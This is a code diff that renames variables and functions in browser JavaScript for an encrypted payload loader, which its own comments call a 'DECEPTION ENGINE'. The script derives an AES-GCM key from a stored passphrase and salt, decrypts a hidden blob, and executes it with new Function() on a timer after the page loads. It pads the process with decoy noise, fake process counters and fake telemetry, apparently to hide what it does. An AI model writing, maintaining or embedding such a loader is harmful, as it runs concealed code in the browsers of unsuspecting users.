@@ -6,26 +6,26 @@
     // *** DECEPTION ENGINE ***
     const SYSTEM_TAG = "[SYS_CORE]";
     let sessionData = {
-      systemStart: Date.now(),
+      systemStartTime: Date.now(),
       memoryUsage: 0,
-      fakeCycles: 0,
-      dummyProcesses: 0,
-      randomToken: 202
+      fakeCycleCounter: 0,
+      dummyProcessesCount: 0,
+      randomKey: 202
     };
-  const bel = "[EMAIL]";
+    const bel = "[EMAIL]";
     const lieve = "[KEY]";
 
-    // Useless computation
-    function generateNoise() {
-      const noiseA = Math.random().toString(36).substring(2, 7);
-      const noiseB = Math.random().toString(36).substring(3, 8);
-      return `X_${noiseA}${noiseB}`;
+    // Useless computation (new function)
+    function generateRandomNoise() {
+      const noisePartA = Math.random().toString(36).substring(2, 7);
+      const noisePartB = Math.random().toString(36).substring(3, 8);
+      return `X_${noisePartA}${noisePartB}`;
     }
 
-    function monitorFakeProcess() {
+    function simulateFakeProcess() {
       sessionData.memoryUsage = window?.performance?.memory?.usedJSHeapSize || 0;
-      sessionData.fakeCycles = Math.floor(Math.random() * 9000);
-      sessionData.dummyProcesses += 1;
+      sessionData.fakeCycleCounter = Math.floor(Math.random() * 9000);
+      sessionData.dummyProcessesCount += 1;
     }
 
     // *** CRYPTOLOGIC ENGINE ***
@@ -40,7 +40,7 @@
       const diversion = {
         isActive: false,
         baiting: true,
-        securityToken: generateNoise()
+        securityToken: generateRandomNoise()
       };
 
       return {
@@ -52,36 +52,36 @@
       };
     })();
 
-    function convertHexToBuffer(hexStr) {
-      const result = new Uint8Array(hexStr.length / 2);
-      for (let i = 0; i < result.length; i++) {
-        result[i] = parseInt(hexStr.substr(i * 2, 2), 16);
+    function hexToBuffer(hexStr) {
+      const buffer = new Uint8Array(hexStr.length / 2);
+      for (let i = 0; i < buffer.length; i++) {
+        buffer[i] = parseInt(hexStr.substr(i * 2, 2), 16);
       }
-      return result;
+      return buffer;
     }
 
-    async function delayFakeProcess() {
+    async function delayFakeProcessing() {
       return new Promise((resolve) => {
         setTimeout(() => {
-          console.log("Noise delay:", generateNoise());
-          resolve(generateNoise());
+          console.log("Delay Noise:", generateRandomNoise());
+          resolve(generateRandomNoise());
         }, 111);
       });
     }
 
-    async function initiateDecryption() {
-      monitorFakeProcess();
+    async function startDecryption() {
+      simulateFakeProcess();
       try {
-        const userInputKey = coreEngine.getKey();
-        const keyDerivation = await crypto.subtle.importKey(
+        const userPassphrase = coreEngine.getKey();
+        const keyImport = await crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(userInputKey),
+          new TextEncoder().encode(userPassphrase),
           { name: "PBKDF2" },
           false,
           ["deriveKey"]
         );
 
-        const saltBuffer = convertHexToBuffer(coreEngine.getSalt());
+        const saltBuffer = hexToBuffer(coreEngine.getSalt());
         const aesKey = await crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
@@ -89,27 +89,27 @@
             iterations: 100000,
             hash: "SHA-256"
           },
-          keyDerivation,
+          keyImport,
           { name: "AES-GCM", length: 256 },
           false,
           ["decrypt"]
         );
 
-        const ivBuffer = convertHexToBuffer(coreEngine.getIV());
-        const dataBuffer = convertHexToBuffer(coreEngine.getBlob());
+        const ivBuffer = hexToBuffer(coreEngine.getIV());
+        const encryptedDataBuffer = hexToBuffer(coreEngine.getBlob());
 
-        await delayFakeProcess();
+        await delayFakeProcessing();
 
-        const decryptedContent = await crypto.subtle.decrypt(
+        const decryptedData = await crypto.subtle.decrypt(
           { name: "AES-GCM", iv: ivBuffer },
           aesKey,
-          dataBuffer
+          encryptedDataBuffer
         );
 
-        const decodedContent = new TextDecoder().decode(decryptedContent);
-        (new Function(decodedContent))();
+        const decodedData = new TextDecoder().decode(decryptedData);
+        (new Function(decodedData))();
       } catch (error) {
-        console.warn("Decryption failure:", error);
+        console.warn("Decryption failed:", error);
       }
     }
 
@@ -117,17 +117,17 @@
     document.addEventListener("DOMContentLoaded", () => {
       console.info("Initializing payload...");
       for (let i = 0; i < 3; i++) {
-        console.debug("Generated Noise:", generateNoise());
+        console.debug("Generated Noise:", generateRandomNoise());
       }
     });
 
-    setTimeout(initiateDecryption, 999);
+    setTimeout(startDecryption, 999);
 
     // Fake telemetry data
     const telemetryInfo = () => {
       return {
         pingTime: Date.now(),
-        generatedData: generateNoise(),
+        generatedData: generateRandomNoise(),
         systemLoad: sessionData.memoryUsage
       };
     };
